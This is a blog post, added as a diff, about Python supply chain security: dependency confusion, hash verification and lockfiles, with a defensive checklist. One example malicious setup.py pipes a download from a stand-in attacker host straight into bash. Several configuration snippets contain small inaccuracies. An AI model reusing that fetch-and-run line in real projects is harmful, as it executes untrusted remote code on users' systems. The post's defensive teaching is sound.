@@ -1,0 +1,251 @@
+---
+title: 'Supply Chain Security in Python: Lessons from pip'
+description: 'Deep dive into Python supply chain security, exploring dependency confusion attacks, hash verification, and lessons learned from contributing to pip.'
+pubDate: '2025-12-10'
+tags: ['python', 'security', 'supply-chain', 'pip', 'open-source']
+draft: false
+---
+
+# Supply Chain Security in Python: Lessons from pip
+
+Software supply chain attacks have become one of the most significant threats in modern software development. As someone who has contributed to pip and studied its security model, I want to share practical insights into how Python's package ecosystem works and how to protect your projects.
+
+## The Attack Surface
+
+When you run `pip install requests`, a remarkable amount of trust is involved:
+
+1. You trust PyPI to serve the authentic package
+2. You trust the network path between you and PyPI
+3. You trust the package maintainer's account hasn't been compromised
+4. You trust all of the package's dependencies (recursively)
+5. You trust that no malicious code was injected during the build process
+
+Any break in this chain of trust can lead to arbitrary code execution on your system.
+
+## Dependency Confusion: A Case Study
+
+Dependency confusion attacks exploit how package managers resolve names. The attack works like this:
+
+1. A company uses an internal package called `company-utils` hosted on a private index
+2. An attacker publishes `company-utils` to the public PyPI with a higher version number
+3. If pip is configured to check both indexes, it may prefer the public (malicious) package
+
+### How pip Resolves Packages
+
+Understanding pip's resolution logic is crucial for defense:
+
+```python
+# Simplified representation of pip's index lookup
+class PackageResolver:
+    def __init__(self, indexes: list[str]):
+        self.indexes = indexes  # Ordered list of package indexes
+
+    def find_package(self, name: str, version_spec: str) -> Package:
+        candidates = []
+
+        for index in self.indexes:
+            # pip checks ALL indexes and collects ALL candidates
+            packages = self.query_index(index, name)
+            candidates.extend(packages)
+
+        # Then selects the best match based on version
+        return self.select_best_candidate(candidates, version_spec)
+```
+
+The key insight: pip doesn't stop at the first index that has a match. It collects candidates from all configured indexes and then selects the best version. This is what enables dependency confusion.
+
+### Mitigation: Index Isolation
+
+The safest approach is complete index isolation for internal packages:
+
+```ini
+# pip.conf - Recommended configuration
+[global]
+index-url = https://pypi.org/simple/
+
+[install]
+# For internal packages, use a separate requirements file
+# with explicit --index-url per package
+```
+
+Or use a repository manager like Artifactory or Nexus that can proxy PyPI while blocking specific package names:
+
+```python
+# requirements-internal.txt
+--index-url https://internal.company.com/pypi/simple/
+--no-deps  # Prevent transitive dependencies from wrong index
+company-utils==1.2.3
+company-auth==2.0.0
+```
+
+## Hash Verification: Your Last Line of Defense
+
+Hash verification ensures that the package you install is byte-for-byte identical to what you expect. This protects against:
+
+- Man-in-the-middle attacks
+- Compromised package indexes
+- Retroactive package tampering
+
+### Generating Hashes
+
+```bash
+# Generate hashes for your dependencies
+pip-compile --generate-hashes requirements.in -o requirements.txt
+```
+
+The output looks like this:
+
+```text
+requests==2.31.0 \
+    --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f \
+    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1
+```
+
+### How pip Verifies Hashes
+
+When you install with hashes, pip performs verification:
+
+```python
+import hashlib
+
+def verify_package(package_path: str, expected_hashes: list[str]) -> bool:
+    """Verify package integrity against expected hashes."""
+
+    with open(package_path, 'rb') as f:
+        content = f.read()
+
+    # Calculate the actual hash
+    actual_hash = hashlib.sha256(content).hexdigest()
+
+    # Check against all expected hashes
+    # (multiple hashes for different platforms/wheels)
+    for expected in expected_hashes:
+        algorithm, digest = expected.split(':')
+        if algorithm == 'sha256' and digest == actual_hash:
+            return True
+
+    return False
+```
+
+### Hash Mode Enforcement
+
+When any package has a hash, pip enters "hash mode" and requires hashes for all packages:
+
+```python
+# This will FAIL if not all packages have hashes
+pip install -r requirements.txt --require-hashes
+```
+
+This all-or-nothing approach is intentional - partial hash verification provides a false sense of security.
+
+## Real-World Lessons from pip Development
+
+Contributing to pip taught me several important lessons about supply chain security:
+
+### 1. Metadata Can Lie
+
+Package metadata (name, version, dependencies) comes from the package itself. A malicious package can claim any metadata:
+
+```python
+# A malicious setup.py could do this:
+setup(
+    name="legitimate-package",  # Typosquatting
+    version="999.0.0",  # Version hijacking
+    install_requires=["malware-package"],  # Dependency injection
+)
+```
+
+This is why hash verification is so important - it verifies the actual content, not just metadata.
+
+### 2. Post-Install Scripts Are Dangerous
+
+Any package with a `setup.py` runs arbitrary Python during installation:
+
+```python
+# Malicious setup.py
+import os
+from setuptools import setup
+
+# This runs BEFORE the package is installed
+os.system("curl https://attacker.com/malware.sh | bash")
+
+setup(name="innocent-package", version="1.0.0")
+```
+
+This is why pip now supports PEP 517/518 builds with isolated build environments, and why the community is moving toward pure wheels.
+
+### 3. Lock Files Are Essential
+
+A lockfile captures the exact versions and hashes of all dependencies at a point in time:
+
+```toml
+# pyproject.toml with locked dependencies (using Poetry format)
+[tool.poetry.lock]
+[[package]]
+name = "requests"
+version = "2.31.0"
+python-versions = ">=3.7"
+
+[package.dependencies]
+certifi = ">=2017.4.17"
+charset-normalizer = ">=2,<4"
+idna = ">=2.5,<4"
+urllib3 = ">=1.21.1,<3"
+
+[package.files]
+{file = "requests-2.31.0-py3-none-any.whl", hash = "sha256:58cd2187c01e..."}
+```
+
+## Security Checklist for Python Projects
+
+Here's my checklist for securing Python project dependencies:
+
+- [ ] **Pin all dependencies** to exact versions in production
+- [ ] **Use hash verification** with `--require-hashes`
+- [ ] **Audit new dependencies** before adding them
+- [ ] **Use a lockfile** (pip-tools, Poetry, or PDM)
+- [ ] **Separate dev/prod dependencies** to minimize attack surface
+- [ ] **Regular updates** with security scanning (pip-audit, safety)
+- [ ] **Private package namespace** - prefix internal packages uniquely
+- [ ] **Index isolation** - don't mix public and private indexes
+- [ ] **Verify package signatures** when available (PEP 458)
+- [ ] **Monitor for typosquatting** on your package names
+
+## Tools for Supply Chain Security
+
+Several tools can help automate supply chain security:
+
+```bash
+# Audit installed packages for known vulnerabilities
+pip-audit
+
+# Generate hashed requirements
+pip-compile --generate-hashes requirements.in
+
+# Check for dependency issues
+pip check
+
+# Scan for malicious packages
+pip-audit --require-hashes -r requirements.txt
+```
+
+## The Future of Python Supply Chain Security
+
+The Python packaging ecosystem is actively improving:
+
+- **PEP 458**: TUF integration for PyPI (signed packages)
+- **PEP 740**: Attestations for provenance tracking
+- **Trusted Publishing**: GitHub Actions can publish without long-lived API tokens
+- **Sigstore**: Keyless signing for package authenticity
+
+These improvements won't eliminate supply chain attacks, but they make attacks harder and detection easier.
+
+## Conclusion
+
+Supply chain security is not a one-time effort but an ongoing practice. The Python ecosystem has made significant progress, but ultimately, security depends on developers understanding the risks and implementing appropriate controls.
+
+The most important takeaway: **treat your dependencies as code from untrusted sources**, because that's exactly what they are until verified.
+
+---
+
+*Interested in supply chain security or have questions about pip internals? Feel free to reach out - I love discussing these topics.*
